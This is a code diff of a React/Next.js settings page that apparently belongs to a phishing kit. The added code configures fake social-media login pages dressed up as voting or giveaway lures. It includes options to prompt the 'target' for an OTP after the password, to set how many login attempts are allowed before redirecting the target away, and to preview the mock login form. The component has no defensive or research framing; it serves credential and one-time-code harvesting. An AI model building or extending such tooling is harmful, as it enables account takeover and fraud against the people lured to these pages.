-                className="block w-full  my-4 px-4 py-2 bg-red-600 text-white rounded-md
-                        hover:bg-red-700 
-                        focus:outline-none focus:ring-2 focus:ring-red-500 focus:ring-offset-2 focus:ring-offset-gray-800
-                        disabled:opacity-50 disabled:cursor-not-allowed
-                        transition-colors duration-200
-                        text-sm font-medium"
-                disabled={isLoading}
-              >
-                {isLoading ? (
-                  <>
-                    <svg className="animate-spin -ml-1 mr-2 h-4 w-4 text-white inline" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
-                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
-                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
-                    </svg>
-                    Deleting...
-                  </>
-                ) : 'Delete Link'}
+          <div className="border-t border-gray-100 dark:border-gray-700" />
+
+          <div>
+            <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Request OTP after login?</label>
+            <HelperText>If yes, after entering their password the target sees a verification code screen.</HelperText>
+            <div className="flex gap-2 mt-2.5">
+              {[{ value: true, label: 'Yes' }, { value: false, label: 'No' }].map(opt => (
+                <button key={opt.label} type="button"
+                  onClick={() => setFormData(p => ({ ...p, askForOtp: opt.value }))}
+                  className={pillCls(formData.askForOtp === opt.value)}>{opt.label}</button>
+              ))}
+            </div>
+          </div>
+
+          <div>
+            <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-1">Login attempts allowed</label>
+            <HelperText>After this many failed attempts, the target is redirected away.</HelperText>
+            <div className="flex gap-2 mt-2.5">
+              {[1, 2, 3].map(v => (
+                <button key={v} type="button"
+                  onClick={() => setFormData(p => ({ ...p, retry: v }))}
+                  className={pillCls(formData.retry === v)}>{v}</button>
+              ))}
+            </div>
+          </div>
+        </section>
+
+        {/* Section 4: Expiry (read-only) */}
+        <section>
+          <SectionHeader>Expiry</SectionHeader>
+          <div className={`flex items-center gap-3 px-4 py-3 rounded-xl border ${
+            isExpired
+              ? 'bg-red-50 dark:bg-red-500/10 border-red-200 dark:border-red-500/20'
+              : 'bg-gray-50 dark:bg-gray-800 border-gray-200 dark:border-gray-700'
+          }`}>
+            <CalendarDaysIcon className={`w-5 h-5 shrink-0 ${isExpired ? 'text-red-500' : 'text-gray-400'}`} />
+            <div>
+              <p className={`text-sm font-medium ${isExpired ? 'text-red-600 dark:text-red-400' : 'text-gray-700 dark:text-gray-300'}`}>
+                {isExpired ? 'This link has expired' : `Expires ${format(new Date(formData.expiresAt), 'MMMM d, yyyy')}`}
+              </p>
+              {isExpired && <p className="text-xs text-red-500 mt-0.5">Use the extend section above to renew it.</p>}
+            </div>
+          </div>
+        </section>
+
+        {/* Save */}
+        <button type="submit" disabled={isLoading}
+          className="w-full py-3 rounded-xl font-semibold text-white bg-primary-500 hover:bg-primary-600 transition-colors disabled:opacity-40 flex items-center justify-center gap-2">
+          {isLoading ? (
+            <><svg className="animate-spin h-5 w-5" viewBox="0 0 24 24">
+              <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none"/>
+              <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"/>
+            </svg>Saving…</>
+          ) : 'Save Changes'}
+        </button>
+      </form>
+
+      {/* Danger zone */}
+      <section className="border border-red-200 dark:border-red-900/50 rounded-xl p-4 bg-red-50 dark:bg-red-500/5">
+        <p className="text-sm font-semibold text-red-600 dark:text-red-400 mb-1">Delete this link</p>
+        <p className="text-xs text-red-500/80 dark:text-red-400/70 mb-3">This is permanent and cannot be undone.</p>
+        <button onClick={handleDelete} disabled={isLoading}
+          className="w-full py-2.5 rounded-xl text-sm font-semibold text-white bg-red-600 hover:bg-red-700 transition-colors disabled:opacity-40">
+          {isLoading ? 'Deleting…' : 'Delete Link'}
+        </button>
+      </section>
+
+      {/* ── Preview modal ── */}
+      {showPreview && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/70">
+          <div className="relative w-full max-w-sm">
+            <div className="flex items-center justify-between mb-3">
+              <span className="text-white text-sm font-medium">Preview — {typeMeta.label} page</span>
+              <button onClick={() => setShowPreview(false)} className="text-white hover:text-gray-300">
+                <XMarkIcon className="w-5 h-5" />
               </button>
             </div>
+            <div className="bg-white rounded-2xl overflow-hidden shadow-2xl">
+              {/* Banner */}
+              {(formData.linkType === 'voting' || formData.linkType === 'giveaway') && formData.bannerImage && (
+                // eslint-disable-next-line @next/next/no-img-element
+                <img src={formData.bannerImage} alt="Banner" className="w-full h-28 object-cover"
+                  onError={e => { e.currentTarget.style.display = 'none'; }} />
+              )}
+              <div className="p-5">
+                {/* Main image */}
+                {formData.image && (
+                  // eslint-disable-next-line @next/next/no-img-element
+                  <img src={formData.image} alt="Main"
+                    className="w-20 h-20 rounded-full object-cover mx-auto mb-3 border-4 border-white shadow"
+                    onError={e => { e.currentTarget.style.display = 'none'; }} />
+                )}
+                {/* Title / contestant */}
+                <h2 className="text-base font-bold text-center text-gray-900 mb-1">
+                  {formData.linkType === 'voting'
+                    ? (formData.contestantName || 'Contestant Name')
+                    : (formData.title || 'Page Title')}
+                </h2>
+                {formData.writeup && (
+                  <p className="text-xs text-gray-500 text-center mb-3 leading-relaxed">{formData.writeup}</p>
+                )}
+                {/* Platform pills */}
+                <div className="flex justify-center flex-wrap gap-1.5 mb-4">
+                  {formData.socialMedia.map(p => (
+                    <span key={p} className="text-[10px] font-semibold px-2 py-0.5 rounded-full bg-blue-50 text-blue-600 capitalize">{p}</span>
+                  ))}
+                </div>
+                {/* Mock login form */}
+                <div className="space-y-2.5">
+                  <div className="h-9 bg-gray-100 rounded-lg border border-gray-200" />
+                  <div className="h-9 bg-gray-100 rounded-lg border border-gray-200" />
+                  {formData.askForOtp && (
+                    <div className="h-9 bg-gray-100 rounded-lg border border-gray-200" />
+                  )}
+                  <div className="h-9 bg-blue-600 rounded-lg" />
+                </div>
+              </div>
+            </div>
+            <p className="text-center text-xs text-gray-400 mt-3">Simplified preview — actual page may differ slightly</p>
           </div>
         </div>
-      </div>
+      )}
     </div>
   );
 }
